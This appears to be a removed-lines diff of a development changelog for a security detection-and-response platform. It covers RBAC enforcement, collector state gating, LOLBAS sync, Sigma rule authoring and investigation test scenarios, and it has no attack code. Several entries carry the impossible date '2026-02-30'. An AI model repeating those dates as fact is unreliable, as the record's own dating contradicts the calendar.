-fallback + RBAC negative (4 mutation paths) + scoped-user reads +
-invalid-rule enable-guard → 409 + capability_not_verdict preserved +
-enable/disable state transitions.
-
-**Full backend regression: 124/124 pass** (109 previous + 15 new).
-Ruff clean on all new files.
-
-**Left for the next milestones (explicit and honest — nothing hidden):**
-* Correlation Engine (temporal / sequence / threshold / group_by / cross-source) — the atomic detections above will feed it
-* Rule testing (positive / negative / FP / regression against Investigation Corpus)
-* Additional acquisition sources: Elastic Detection Rules, MITRE ATT&CK analytics, Snort/Suricata IDS, YARA
-* OSINT/TI Hub (VirusTotal · AbuseIPDB · OTX · URLhaus · MalwareBazaar · MISP)
-* Corpus expansion 8 → 50 → 100 → 250+
-
----
-
-
----
-
-## ✅ 2026-02-30 · P0-8 Data Sources + Collectors + Real Telemetry (SHIPPED)
-
-**New authoritative main-backend routers (RBAC-enforced + audit-logged):**
-
-| Router | Endpoints | Coverage |
-|---|---|---|
-| `xdr_data_sources.py` | list/get/create/update/enable/disable/test/rotate/delete + `/kinds/catalog` | 10/10 RBAC-guarded |
-| `xdr_collectors.py`   | list/get/create/update/start/stop/enable/disable/test/rotate/delete + `/protocols/catalog` | 12/12 RBAC-guarded |
-| `xdr_ingest.py`       | `POST /telemetry` — the ONLY code path that may set CONNECTED | 1/1 RBAC-guarded |
-
-**State machine (identical vocabulary to the P0-8 directive):**
-```
-ADOPTED → CONFIGURED → STARTING → CONNECTED
-                                   ↓
-                       AUTH_FAILED / CONNECTION_FAILED /
-                       NO_TELEMETRY / PARSE_ERROR / DEGRADED / DISABLED
-```
-Admin API CANNOT promote to CONNECTED — attempting it in the internal
-`_transition_state(admin=True)` raises `CONNECTED_REQUIRES_TELEMETRY`.
-
-**Evidence-backed CONNECTED gate** (in `xdr_ingest.py`):
-* CONNECTED assigned only when `received > 0 AND parsed > 0 AND normalized > 0`.
-* Error ratio > 10% → DEGRADED (never CONNECTED).
-* `parser_ok=False` on every event → PARSE_ERROR.
-* Every state transition emits `COLLECTOR_STATE_CHANGED` audit with the
-  exact counter evidence (`received/parsed/normalized/errors`).
-
-**Protocol registry — honest implementation status:**
-
-| Protocol | Status | Notes |
-|---|---|---|
-| syslog  | **IMPLEMENTED** | Real receiver · `nivxray-xdr-collector/framework/syslog.py` |
-| webhook | **IMPLEMENTED** | Real HMAC-validated receiver |
-| rest    | **IMPLEMENTED** | Real REST poller |
-| cef     | SCAFFOLD | Uses syslog transport; CEF parser wiring pending |
-| leef    | SCAFFOLD | Uses syslog transport; LEEF parser wiring pending |
-| kafka   | SCAFFOLD | Consumer not implemented |
-| otlp    | SCAFFOLD | Receiver not implemented |
-| wef     | SCAFFOLD | Windows Event Forwarding subscription not implemented |
-| file    | SCAFFOLD | File tailer not implemented |
-| edr     | SCAFFOLD | Vendor adapter framework exists; wiring pending |
-| ndr     | SCAFFOLD | Vendor adapter framework exists; wiring pending |
-| cloud   | SCAFFOLD | AWS / GCP / Azure audit connectors not wired |
-
-**Total: 3 IMPLEMENTED · 9 SCAFFOLD · 0 BLOCKED.** UI badge is honest.
-
-**Tenant isolation (defense-in-depth):**
-* Envelope `tenant_id` MUST equal collector's `tenant_id` → else HTTP 403 `TENANT_ISOLATION_VIOLATION`.
-* Header tenant MUST equal collector's `tenant_id` → else HTTP 403.
-* List endpoints scope by tenant — another tenant's collector names do NOT appear.
-
-**Audit actions emitted:**
-`DATA_SOURCE_CREATED · DATA_SOURCE_UPDATED · DATA_SOURCE_ENABLED ·
-DATA_SOURCE_DISABLED · DATA_SOURCE_TESTED ·
-DATA_SOURCE_CREDENTIAL_ROTATED · DATA_SOURCE_DELETED ·
-COLLECTOR_CREATED · COLLECTOR_UPDATED · COLLECTOR_STARTED ·
-COLLECTOR_STOPPED · COLLECTOR_ENABLED · COLLECTOR_DISABLED ·
-COLLECTOR_TESTED · COLLECTOR_CREDENTIAL_ROTATED · COLLECTOR_DELETED ·
-COLLECTOR_STATE_CHANGED (carries the evidence block).`
-
-**Frontend (Vercel-deployed):**
-* `DataSourcesBody.jsx` — add / edit / enable / disable / test / delete, kinds catalog dropdown reads live backend.
-* `CollectorsBody.jsx` — same + protocol registry badge (IMPLEMENTED / SCAFFOLD / BLOCKED) + **State Evidence panel** on each row.
-
-**Live E2E on preview backend (proof of the CONNECTED gate):**
-```
-seed admin           → HTTP 200
-create collector     → col_0a2558ae9fcd4fc59c4a
-start collector      → state = STARTING
-POST /ingest/telemetry (5 clean envelopes)
-                       → collector_state = CONNECTED
-                       → reason "telemetry received/parsed/normalized: 5/5/5"
-GET /collectors/{id} → rx/parsed/norm/err = 5/5/5/0
-cross-tenant inject  → HTTP 403 TENANT_ISOLATION_VIOLATION
-```
-
-**Test totals (backend regression):**
-109/109 passing = 89 previous + **20 new P0-8 tests**:
-CRUD, kind/protocol validation, admin transitions, ILLEGAL transition
-rejection (admin cannot set CONNECTED), parse-failure → PARSE_ERROR,
-error-ratio → DEGRADED, real-telemetry → CONNECTED, envelope-tenant
-isolation, header-tenant isolation, list-does-not-leak,
-data-source counters bubble up, audit chain remains valid.
-
-**Ruff:** all new files clean.
-
----
-
-
----
-
-## ✅ 2026-02-30 · P0-0 LOLBAS Live-Sync + Deployment Consistency (SHIPPED)
-
-**Problem:** Standalone NivXRay XDR Vercel UI showed `NEVER_SYNCED · UPSTREAM UNAVAILABLE · 404`
-while the backend held 242 entries + 11,196 primitives. Two independent bugs.
-
-**Root causes:**
-1. **Frontend:** axios `baseURL = ${BACKEND_URL}/api`, but 7 admin bodies wrongly
-   called `api.get("/api/xdr/…")` → resolved to `/api/api/xdr/…` → 404.
-2. **Backend:** no cold-boot fallback; a fresh pod with unreachable upstream
-   would show `NEVER_SYNCED` forever.
-
-**Fix (backend `/app/backend/routers/xdr_lolbas.py`):**
-- Bundled `lolbas_snapshot.json` (242 entries) shipped alongside the router
-  as `file:///app/backend/fixtures/lolbas_snapshot.json`.
-- `_sync_pipeline(url, fallback_urls=[…], idempotent=True)` — transparent
-  primary → fallback cascade; short-circuits on matching `upstream_sha256`.
-- `POST /api/xdr/lolbas/sync?use_bundled_fallback=true` (default) uses cascade.
-- `POST /api/xdr/lolbas/ensure-synced` — idempotent boot-time entry point.
-- FastAPI `on_startup` thread launches `ensure_synced()` — non-blocking,
-  never leaves a cold pod empty.
-- `GET /api/xdr/lolbas/status` now returns honest `sync_state ∈
-  {SYNCED, PARTIAL, UPSTREAM_UNAVAILABLE, NEVER_SYNCED}` + `bundled_fallback_available`.
-
-**Fix (frontend `/app/apps/nivxray-xdr/src/xdr/admin/*.jsx`):**
-- Stripped duplicate `/api/` prefix across 25 call sites in 8 files.
-- `ContentPackLolbasBody.jsx` renders `sync_state` + `BUNDLED FALLBACK · OK` badge.
-
-**Verified E2E on live preview backend:**
-- `sync_state=SYNCED · entries=242 · primitives=11196`
-- Bad primary URL → automatic bundled fallback → `outcome=COMPLETE`, `fallback_used=true`
-- Cold-boot with unreachable upstream + wiped DB → still finishes COMPLETE from bundle
-- Vercel UI shows SYNCED + 242/242/242/0/100%/11196 + BUNDLED FALLBACK · OK
-
-**Tests added:** 3 new (`test_sync_falls_back_to_bundled_…`,
-`test_ensure_synced_is_idempotent_…`, `test_status_reports_sync_state_…`).
-Full LOLBAS suite: **20/20 pass**.
-
----
-
-## ✅ 2026-02-30 · P0-1 Global RBAC Retrofit (SHIPPED)
-
-**Directive:** Apply `require_permission(...)` server-side across ALL existing
-XDR routes so no privileged operation can be bypassed by direct API access.
-
-**Route inventory · 60 XDR endpoints across 7 routers:**
-
-| Router | Before | After |
-|---|---|---|
-| `xdr_secrets.py`          | 0/7  | **7/7 ✅** |
-| `xdr_api_keys.py`         | 5/7  | **7/7 ✅** |
-| `xdr_webhooks.py`         | 6/9  | **9/9 ✅** |
-| `xdr_lolbas.py`           | 0/12 | **12/12 ✅** |
-| `xdr_audit_log.py`        | 0/4  | **4/4 ✅** (lazy import — resolves circular RBAC ↔ audit) |
-| `xdr_rbac.py`             | 13/18| **18/18 ✅** |
-| `xdr_response_evidence.py`| 0/3  | **3/3 ✅** |
-| **Total**                 | **24/60** | **60/60 ✅** |
-
-**Permission additions:** `audit.write` (new action) → protects `POST /audit-log/emit`
-so nobody can inject forged audit rows without `audit.write`.
-
-**Enforcement contract (deterministic on every mutation):**
-```
-Request → Authentication → Tenant Resolution → RBAC Permission
-        → Resource/Scope Authorization → Mutation → Audit
-```
-
-Denial response: `HTTP 403 {"code":"ACCESS_DENIED","permission":"<perm>","reason":"<code>"}`
-Denial audit event: `action=ACCESS_DENIED, outcome=FAILURE, resource_id=<perm>`.
-
-**Verified:**
-- 21 new negative tests (`test_xdr_rbac_enforcement.py`) exercise:
-  - 15 parameterised denials across every retrofitted router
-  - Owned-perm allow paths
-  - `platform_admin` positive control
-  - `ACCESS_DENIED` audit emission
-  - Audit chain remains `valid` after denials
-  - Tenant isolation across principals
-  - Wildcard `secrets.*` expansion covers create/read but not `users.create`
-- Live E2E on preview backend: unauthorized `POST /rbac/roles` → HTTP 403 with
-  structured detail; authorized `GET /lolbas/status` → HTTP 200.
-
-**Semantics preserved (per owner directive):**
-- Capability ≠ Verdict remains intact. `powershell.exe`, `cmd.exe`, `rundll32.exe`
-  still emit `OBSERVED` / `WEAK` evidence, never automatic verdicts.
-- Every existing LOLBAS test (12) still passes.
-
-**Test totals:** 68 P0 → **89 P0 (68 original + 21 new negative-enforcement)**. All green.
-**Ruff:** all XDR routers + new tests clean.
-
-**Not yet enforced (bootstrap allow — documented, not a regression):**
-- Fresh tenants with zero provisioned users bypass enforcement so the first
-  admin can be seeded (chicken-and-egg). As soon as the first user is
-  persisted for the tenant, enforcement engages. This is the same behaviour
-  the original `xdr_rbac.py` shipped with.
-
----
-
-
----
-
-## ✅ 2026-02-10 · P0 Investigator Workspace foundations (SHIPPED)
-
-Per the owner directive ("finish scope"), executed the P0 items:
-
-### 1 · WorkspaceSelectionContext (one selection bus)
-`src/xdr/investigation/WorkspaceSelectionContext.jsx` — a global
-selection provider hosting `{ kind, ref, source, at, meta? }` with
-kinds ∈ {process · ioc · host · user · evidence · technique · rule ·
-response · playbook}.  Exposes `setSelection`, `useSelection`, and
-per-kind facets (`processId`, `iocRef`, `technique`, …).  Wraps the
-Investigation surface on `XdrIncidentDetailPage`; every existing +
-new panel can subscribe.  Never fabricates: `useSelectionOf(kind)`
-returns `null` when the current selection is a different kind.
-
-### 2 · Investigation Completeness (deterministic gap checker)
-`src/xdr/investigation/completeness.js` — deterministic scorer over
-15 facets (identity · endpoint · process · file · network · dns ·
-persistence · threat_intel · mitre · lateral_movement · blast_radius ·
-response · evidence · root_cause · user_validation).  Score =
-`(present + 0.5·partial) / total`.  `XdrCompletenessPanel` renders
-per-facet OK / PARTIAL / MISSING with source attribution and blocks
-"Investigation Complete" until score = 1.0.  Never guesses.
-
-### 3 · Rule Tuning Workbench · `/xdr/detect/tuning/:ruleId`
-`src/xdr/pages/XdrRuleTuningPage.jsx` — evidence-backed workbench
-that consumes the base primitives (which already exist):
-- `/api/regression/latest`, `/api/regression/run`, `/api/regression/gate`
-- `/api/batch/test/json`
-- `/api/corrections/analytics`
-- `/api/corpus/validate/json`
-Every metric card is honest: if the base returns nothing, the card
-renders **INSUFFICIENT TELEMETRY FOR METRIC**.  Replay controls: Last
-24h · Last 7d · Golden Corpus.  Pivot from the Detection Rule editor
-via "Open Rule Tuning Workbench" link.
-
-### 4 · Investigation Corpus (8 categories · scenario schema)
-`src/xdr/corpus/scenarioRegistry.js` + `docs/corpus/scenarios/**/*.json`.
-One seed scenario per required category:
-- SCN-2026-BEN-001 · IT admin PowerShell inventory
-- SCN-2026-MAL-001 · Encoded PowerShell → C2 → persistence
-- SCN-2026-FP-001  · Vulnerability scanner triggers encoded-PS rule
-- SCN-2026-AMB-001 · PsExec used by IT — cannot yet distinguish
-- SCN-2026-INC-001 · Detection fires but process metadata missing
-- SCN-2026-CON-001 · TI marks domain malicious, DNS shows CDN
-- SCN-2026-UNK-001 · First-seen binary from low-signal source
-- SCN-2026-MS-001  · Phishing → OAuth theft → lateral movement → staging
-
-Each scenario exercises the FULL loop: raw events → normalized
-evidence → expected entities/correlations/rules/MITRE → attack story
-→ verdict → severity → recommendations → playbook → response outcome
-→ report sections.  Corpus admin page (`/xdr/admin/corpus`) renders
-category coverage, search + filter, and per-scenario validation.
-
-### 5 · Anti-hallucination CI gate extended
-`tests/adoption/test_capability_registry_matches_base.mjs` now ALSO
-verifies:
-- **8 corpus categories** each have ≥1 scenario (else CI fail)
-- Every scenario is valid JSON with matching id + category
-
-Result: **9/9 engines · 46/46 registry rows · 8/8 corpus categories**.
-
-### 6 · Wired into Investigation surface
-`XdrIncidentDetailPage` Investigation tab now hosts, in order:
-1. Evidence-First Canvas (with sync bus available for future extension)
-2. Investigation Completeness (new)
-3. Verdict Stage-2 (authoritative)
-4. Recommended Next Steps (deterministic composer)
-5. Investigation Report (authoritative)
-6. DIE / IEDDE / IUE / UAIE panels
-Everything wrapped in `WorkspaceSelectionProvider`.
-
-### Verification
-- Response Engine pytest **27/27**
-- Base backend evidence pytest **10/10**
-- Collector pytest **44/44**
-- Anti-hallucination + corpus-coverage gate green
-- `yarn build` clean · new lazy chunks (`XdrRuleTuningPage`,
-  `XdrAdminPage` grew to 72kB with `CorpusBody` + `EnginesBody`)
-- Local Vite dev server verified: Admin › Corpus renders 8/8
-  categories covered with 8 scenarios listed and validated live.
-
-### Owner-locked invariants held
-- Base `/app/backend` still authoritative and unmodified.
-- Consumes existing base engines/APIs (regression, batch-test,
-  corrections, corpus_validate, mitigations); zero duplication of
-  SSOT / IKG / Verdict / Regression / Response engines.
-- No fake telemetry.  Metrics either come from real base data or
-  render `INSUFFICIENT TELEMETRY FOR METRIC` / `MISSING`.
-- Deterministic-first, AI-optional preserved (composer + corpus + gap
-  checker are pure logic; no ML in the loop).
-
-### ⚠️ Deployment gap (unchanged)
-All work is in `/app/apps/nivxray-xdr` (local mirror).  To surface on
-`https://nivxray-xdr.vercel.app`, the user must press **Save to
-GitHub** — Vercel auto-deploys on push to
-`jpreddy017/nivxray-xdr` main.  Emergent cannot push git on the
-user's behalf.
-
-### Still to build (per capability-gap audit)
-- **Playbook Tuning Workbench** (`/xdr/respond/tuning/:playbookId`) —
-  needs a new Response Engine analytics endpoint (EXTEND).
-- **Recommendation Tuning Workbench** (`/xdr/investigate/tuning/recommendations`)
-  — explainability + suppression + A/B compare.
-- **Extend selection sync** — DIE/IEDDE/IUE/UAIE + Recommendations
-  panels currently receive `incident` only; wire them to
-  `useSelection()` so a canvas click updates every panel.
-- **XdrReplayEngine** — compose regression + batch-test + local
-  recommender + playbook simulator into `{ before, after, delta }`.
-- **Corpus expansion** — more scenarios per category (target ≥5/cat
-  before ML enters the loop).
-- **Investigation Report auto-generation** across all 22 report
-  sections listed in the malicious/multi-stage scenarios.
-
-
----
-
-
-## ⚠️ 2026-02-10 · Deployment gap explained
-
-Every UI change in this session lives in `/app/apps/nivxray-xdr` (local
-mirror).  It is verified via `yarn build` and by running `vite dev` in
-this pod (Admin › Engines rendered live with 51 engines · 35 ADOPT ·
-14 CONNECTED · 2 BASE_ONLY).  To surface it on
-`https://nivxray-xdr.vercel.app` the user must press **Save to
-GitHub** in the chat input; Vercel auto-deploys on push to
-`jpreddy017/nivxray-xdr` main.  Emergent cannot push git on the user's
-behalf.
-
-
----
-
-## ✅ 2026-02-10 · Capability-Gap Audit (10 areas)
-
-Delivered `docs/NIVXRAY_XDR_CAPABILITY_GAP_AUDIT.md`.  Every row
-cites a concrete backend path; every classification is `ADOPT ·
-CONSUME · ADAPT · EXTEND · REBUILD · NEW · NOT_PRESENT`.  No
-speculation.
-
-### Top findings
-- **Workspace** — 30 native base pages inspected; the biggest gap is
-  **selection sync**: DIE/IEDDE/IUE/UAIE + Recommendations panels
-  currently receive `incident` only, not a live `selection` bus.
-- **Corpus** — base has 6 golden-corpus modules + full
-  `/api/regression/*`, `/api/batch/test/*`, `/api/corpus/validate/*`
-  and analyst-corrections lifecycle with rollback.  XDR consumes
-  none of them yet for tuning.  Scenario-level corpus is XDR-owned
-  (NEW) because base corpus is per-input.
-- **Rule tuning** — every metric can be sourced from base
-  (`/api/regression/latest`, `/api/batch/test/json`,
-  `/api/regression/gate`); the UI is the only missing piece.
-- **Playbook tuning** — Response Engine has execution records; needs
-  a new analytics endpoint (`GET /api/respond/executions/analytics`).
-- **Recommendation tuning** — the deterministic composer shipped
-  this session; the tuning workbench and A/B compare surface remain.
-
-### Priority-ranked backlog (from audit)
-- **P0 · One investigation OS** — `WorkspaceSelectionContext` bus +
-  continuous recompute + recommendation deep-links.
-- **P0 · Corpus / Replay / Regression** — scenario corpus + XDR
-  replay engine + CI regression.
-- **P0 · Rule / Playbook / Recommendation tuning workbenches**.
-- **P1** · Evidence Explorer · native Command Intelligence · History ·
-  Related-incidents · Global search.
-- **P1** · Feedback-loop tightening (auto-refresh on new evidence).
-- **P2** · Vendor adapters (deliberately deprioritised).
-
----
-
-## ✅ 2026-02-10 · Recommendation Intelligence + Engine Panels shipped
-
-- `src/xdr/intel/recommendationEngine.js` — deterministic composer:
-  base evidence-driven mitigations + rule matches + IOC dispositions +
-  verdict + playbook state.  Every rec carries `supporting[]` +
-  `risk_modifiers[]`; already-executed actions are surfaced but
-  suppressed from re-recommendation.
-- `src/xdr/intel/XdrRecommendationsPanel.jsx` — analyst-facing
-  Recommended Next Steps on the Investigation surface, with `why?`
-  explainability toggle per row.
-- `src/xdr/adopt/baseCapabilities.js` gained typed consumers for
-  the base tuning primitives:
-  - `RecommendationsConsumer` (`/api/decode/mitigations/evidence_driven` +
-    `/api/mitigations/*`)
-  - `PlannerConsumer`, `RegressionConsumer`, `BatchTestConsumer`,
-    `CorpusConsumer`, `CorrectionsConsumer`.
-- **P1 engine panels** (DIE / IEDDE / IUE / UAIE) mounted on the
-  Investigation surface — verified rendering on the local Vite dev
-  server.
-- **Admin › Engines** page ships the data-driven adoption diagram
-  (`51 engines · 35 ADOPT · 14 CONNECTED · 2 BASE_ONLY`), backed by
-  the anti-hallucination CI gate (`test_capability_registry_matches_base.mjs` —
-  46 base-owned rows · 0 gaps).
-
-
----
-
-## ✅ 2026-02-10 · Full Technology Adoption + Admin › Engines (SHIPPED)
-
-Executed the "Full NivXRay Technology Adoption Directive" end-to-end.
-No engine invented, none duplicated, none renamed.  Every canonical
-NivXRay engine now has an inspected, code-backed registry entry AND a
-typed XDR consumer.
-
-### 1 · Evidence-backed matrix rewritten
-`docs/NIVXRAY_XDR_TECHNOLOGY_ADOPTION_MATRIX.md` — fully replaced.
-- Every named acronym verified in `/app/backend/`:
-  DIE (`services/die/` + `routers/die.py`), IEDDE (`routers/iedde.py`),
-  IUE (`services/iue/` + `routers/iue_lane_{a,b,c}.py` + `iue_timeline.py`),
-  UAIE (`services/uaie/` + `routers/uaie.py` + `uaie_catalog.py`),
-  UIL (`services/uil/` + `routers/uil.py`), IDA (`services/ida/`),
-  CEM (`services/cem.py` + `v2/cem/`),
-  **ICE (`services/ice/correlate.py`)** — PRESENT despite earlier assumption,
-  **VEEE (`services/veee/`)** — PRESENT despite earlier assumption.
-- 30+ additional real engines catalogued (SSOT, IKG, verdict Stage-2,
-  correlations, IOC intel, threat intel, MITRE mapper, sigma,
-  behavioral registry, process tree, trajectory, NivXForge, v2/*
-  packages, golden corpus, analyst corrections, and more).
-- Each row cites a concrete file path + API surface.
-- Adoption method assigned per row (ADOPT / ADAPT / EXTEND / PROXY /
-  SHARED_LIBRARY / NEW / BASE_ONLY / NOT_PRESENT / EXTERNAL).
-
-### 2 · Adoption layer extended
-- `docs/NIVXRAY_CAPABILITY_REGISTRY.json` — 12 new capabilities
-  registered with concrete backend paths (`engine.die`, `engine.iedde`,
-  `engine.iue.lane_{a,b,c}`, `engine.iue.timeline_fuse`,
-  `engine.uaie.catalog`, `engine.uaie.dry_run`, `engine.uil.{classify,split,investigate}`,
-  `engine.ida`, `engine.ice`, `engine.cem`, `engine.veee`).
-- `src/xdr/adopt/baseCapabilities.js` — typed consumers added:
-  `DieConsumer`, `IeddeConsumer`, `IueConsumer`, `UaieConsumer`,
-  `UilConsumer`, `IceConsumer`.
-- `src/xdr/capabilityRegistry.js` — honesty banner now distinguishes
-  `not_wired · base_only · external · not_present · not_implemented`.
-
-### 3 · P1 · Analyst-facing panels wired
-New `src/xdr/adopt/enginePanels.jsx` mounts four consumers on the
-Investigation surface (`XdrIncidentDetailPage`):
-- **DIE Decoder Chain Panel** (`data-testid=xdr-die-chain-panel`) —
-  analyst pastes a payload, calls `POST /api/die/analyze`, renders the
-  stage-by-stage decode chain, canonical output, extracted IOCs, and
-  provenance.
-- **IEDDE Stage Inspector** (`xdr-iedde-stage-panel`) — calls
-  `POST /api/iedde/analyze`, shows interpreter identification,
-  iteration count, stop reason, per-iteration stage trace with
-  canonicality delta, final technique inventory.
-- **IUE Timeline Panel** (`xdr-iue-timeline-panel`) — calls
-  `GET /api/iue/lane-a/status`, `GET /api/iue/lane-c/status`, and
-  `POST /api/iue/timeline/fuse` to render the authoritative unified
-  timeline with lane attribution + technique tags.
-- **UAIE Catalog Panel** (`xdr-uaie-catalog-panel`) — calls
-  `GET /api/uaie/catalog`, renders the relationship-rich capability
-  catalog with produces/requires per row + dependency-edge count +
-  schema version.
-- UIL / IDA / CEM registered honestly in the registry as
-  `ADOPT / BASE_ONLY`; no fabricated UI.
-
-### 4 · Anti-hallucination CI gate
-`tests/adoption/test_capability_registry_matches_base.mjs` — Node ESM
-regression test.  Fails CI if:
-- Any of DIE / IEDDE / IUE / UAIE / UIL / IDA / CEM / ICE / VEEE is
-  missing its concrete implementation.
-- Any registry row marked `owner ⊇ base` references a `backend_path`
-  or `source` that does NOT exist on disk.
-- Any row falsely claims `NOT_PRESENT` when the file exists.
-- Result today: **46 base-owned rows verified · 0 gaps · 9/9 engines present**.
-
-### 5 · Admin → Engines (NEW native surface)
-Route: `/xdr/admin/engines`.
-- Reads exclusively from `docs/NIVXRAY_CAPABILITY_REGISTRY.json` —
-  the same registry the anti-hallucination CI gate validates.
-- Header strip: total engine count + status-band histogram
-  (CONNECTED / ADOPT / BASE_ONLY / NEW / EXTERNAL).
-- Search + group filter (canonical acronyms, evidence & analysis,
-  detection & correlation, investigation & IKG, response & collector).
-- **Data-driven architecture diagram** (SVG, `xdr-engines-architecture`):
-  four lanes — XDR Surfaces → Adopt Layer → Base Engines (rendered
-  from the actual canonical rows) → Authoritative Out (SSOT, Verdict
-  Stage-2, Response Engine).
-- Every engine card shows: canonical name, id, base_api, backend_path,
-  owner, adoption method, honest status banner.
-- Footer surfaces provenance: registry file + regression test path +
-  link to the adoption matrix.
-- Sidebar entry added between Overview and Integrations (`Boxes`
-  icon).  No `NOT CONNECTED` state — the registry IS the authoritative
-  source for this surface.
-
-### Verification
-- Response Engine pytest **27/27**.
-- Base backend evidence pytest **10/10**.
-- Collector pytest **44/44**.
-- Anti-hallucination gate: **9/9 engines present · 46 rows · 0 gaps**.
-- `yarn build` clean · 4 additional lazy chunks · Admin bundle
-  now 48kB (was 28kB — includes EnginesBody + registry).
-
-### Owner-locked invariants held
-- Base `/app/backend` still authoritative and unmodified.
-- XDR consumes; never re-implements SSOT · Verdict · Correlation ·
-  Decoder · IUE · DIE · IEDDE · UAIE · UIL · IDA · CEM · ICE · VEEE.
-- Response Engine SQLite still authoritative for execution state.
-- One XDR write path preserved: `POST /api/xdr/response-evidence`.
-
-### Still queued (P2 backlog, per owner directive)
-- Investigation Canvas d3-force layout.
-- Phase C CrowdStrike vendor adapter.
-- NTR (Network Detection Response) + ITDR expansion.
-
----
-
-
-## ✅ 2026-02-10 · Technology Adoption — Four P0 Consumers Wired
-
-Continued the adoption program: XDR now CONSUMES the authoritative
-NivXRay engines rather than re-implementing them.  Zero duplicate
-engines introduced.
-
-### 1 · Verdict Stage-2 Consumer
-- `XdrVerdictPanel` (`src/xdr/adopt/consumerPanels.jsx`) calls
-  `POST /api/verdict/stage2` directly.  Renders the authoritative
-  verdict + severity + confidence, contributing evidence, MITRE
-  techniques (deep-linked to heatmap), and negative-explainability
-  reasons.  No second XDR verdict engine.
-- Mounted on `XdrIncidentDetailPage.jsx` above the legacy subtabs.
-
-### 2 · IOC Intelligence Consumer
-- `XdrIocEnrichmentPanel` calls `GET /api/ioc/lookup`.
-- Wired into the Investigation Canvas Entity Inspector — selecting
-  an `ip / domain / hash / url` node now inline-fetches reputation,
-  malware-family attribution, sources, first-seen, and related
-  incidents from the authoritative IOC intelligence.  No local IOC DB.
-
-### 3 · Decode Chain Consumer
-- `decodeCommandLineViaBase` calls `POST /api/analyze` and is
-  surfaced as a **"Decode via NivXRay"** button next to Evaluate on
-  the Sigma test/replay screen.  The XDR editor NEVER implements
-  its own decoder; when the base is unreachable the panel shows
-  the honesty banner rather than an ad-hoc fallback.
-
-### 4 · Investigation Report Consumer
-- `XdrInvestigationReportPanel` calls
-  `GET /api/incidents/{id}/summary`.  Mounted on the Investigation
-  tab so analysts see the authoritative report in-place — no
-  second XDR report engine.
-
-### Shared adoption primitives
-- `src/xdr/adopt/baseCapabilities.js` — thin, typed HTTP client for
-  every base API the XDR consumes.  On failure returns
-  `{ ok: false, error, not_wired }` so the honesty banner can
-  render.
-- `src/xdr/adopt/consumerPanels.jsx` — the four consumers.
-- `src/xdr/capabilityRegistry.js` — `honestyBanner(id)` used by
-  every consumer so unwired states always surface
-  `AVAILABLE IN NIVXRAY — XDR ADAPTER NOT YET CONNECTED`.
-
-### Honesty invariants (upheld)
-- **No fabricated verdict.**  If `/api/verdict/stage2` fails, the
-  panel says so; nothing invented.
-- **No fabricated IOC verdict.**  If `/api/ioc/lookup` fails,
-  the enrichment box says so.
-- **No shadow decoder.**  If `/api/analyze` fails, the button
-  reports it — never a home-grown base64 helper.
-- **No second Investigation report writer.**
-
-### Verification
-- Response Engine pytest **27/27** · Base backend **10/10** ·
-  Collector **44/44** · frontend `yarn build` clean.
-
-### Still to wire (from the Adoption Matrix)
-- Correlation engine consumer (`engine/correlation_engine.py`).
-- Process-tree deep-link → real base call (`/api/edr/process-tree`).
-- Analyst-corrections consumer (`/api/corrections`).
-- Behavioral registry consumer (`/api/behavioral`).
-- Golden-corpus regression proof in XDR CI.
-
----
-
-
----
-
-## ✅ 2026-02-10 · Detection Engineering + Technology Adoption Directive
-
-### Detection Engineering (Milestone D)
-- **`sigmaEngine.js`** — adopts the open **Sigma** detection format
-  (SigmaHQ) rather than inventing a DSL.  Deterministic evaluator
-  supports the common Sigma modifier set (`contains`, `startswith`,
-  `endswith`, `all`, `gt/gte/lt/lte`, `re`, `null`).  Rules with
-  unsupported modifiers are marked honestly (`unsupported: [...]`)
-  and the engine refuses to fake a match.
-- **`detectionRuleStore.js`** — Rule persistence with the required
-  lifecycle (`draft → testing → enabled → disabled → deprecated`),
-  version history with per-change notes, MITRE technique derivation
-  from Sigma tags, and coverage-by-technique / by-data-source view.
-- **`/xdr/detections`** — Detection Engineering catalog with the
-  runtime-honesty banner `AUTHORING AVAILABLE — DETECTION RUNTIME
-  NOT WIRED` (no fake execution).
-- **`/xdr/detections/:id`** — Rule editor workstation: Sigma YAML
-  editor with live parse + unsupported-modifier warnings, metadata
-  sidebar, lifecycle transitions, version history, test/replay with
-  evidence-backed evaluation trace ("MATCH" always accompanied by
-  the concrete fields+values that fired).
-- Sample rule ships: **Encoded PowerShell Execution** (MITRE
-  `T1059.001`), immediately testable against a synthetic Sysmon
-  process-creation event.
-
-### Technology Adoption Directive
-Owner directive: *NivXRay XDR must adopt what NivXRay Tool already
-implements — never re-implement.*  Delivered the three governance
-artefacts required:
-
-- **`docs/NIVXRAY_XDR_TECHNOLOGY_ADOPTION_MATRIX.md`** — Full
-  capability inventory across Evidence & Analysis / Detection &
-  Intelligence / Investigation / Verdict / Response / Testing.
-  Each capability tagged with adoption method (`CONSUME`, `PROXY`,
-  `SHARED_LIBRARY`, `ADAPTER`, `EXTEND`, `NEW`, `EXTERNAL`) and
-  status (`ADOPT` / `CONNECTED` / etc.).  Priority-ordered gap
-  report.  ~32 capabilities catalogued from the base
-  `/app/backend/` (89 routers + rich `engine/` folder).
-- **`docs/NIVXRAY_XDR_SHARED_ENGINE_ARCHITECTURE.md`** — Layer
-  contract (who owns what), boundary invariants (base is
-  authoritative; XDR writes only via
-  `POST /api/xdr/response-evidence`), adoption methods, honesty
-  invariants (`AVAILABLE IN NIVXRAY — XDR ADAPTER NOT YET
-  CONNECTED`), and the testing invariant that a capability is not
-  "adopted" until a wire test + regression test + honesty test
-  are all green.
-- **`docs/NIVXRAY_CAPABILITY_REGISTRY.json`** — Machine-readable
-  registry (32 entries) consumed by the XDR frontend via
-  `src/xdr/capabilityRegistry.js`; provides `getCapability`,
-  `statusOf`, `honestyBanner` helpers so any surface can render the
-  honest state of a capability rather than fake it.
-
-### Adopt-before-invent rule (now codified)
-Every new XDR need must first ask: "Does the base already have
-this?".  If yes: `CONSUME` / `PROXY` / `SHARED_LIBRARY`.  Only if
-no: adopt an established open standard/library (`EXTERNAL`), and
-only if both fail: `NEW`.  Documented in the Adoption Matrix and
-enforced through the registry's honesty banner.
-
-### Verification
-- Response Engine pytest **27/27**.
-- Base backend evidence pytest **10/10**.
-- Collector pytest **44/44**.
-- `yarn build` clean.  Two new lazy chunks (`XdrDetectionsPage`,
-  `XdrDetectionRuleEditorPage`).
-- Sigma engine sanity-checked with a real match (+ real non-match)
-  via Node ESM execution — behavior evidence-backed.
-
----
-
-
----
-
-## ✅ 2026-02-10 · Investigation Workspace — Visual Intelligence Pass (P0)
-
-Landed the P0 items of the "Visual Intelligence Pass" you directed —
-evolved the existing Evidence-First Workspace, did NOT replace it.
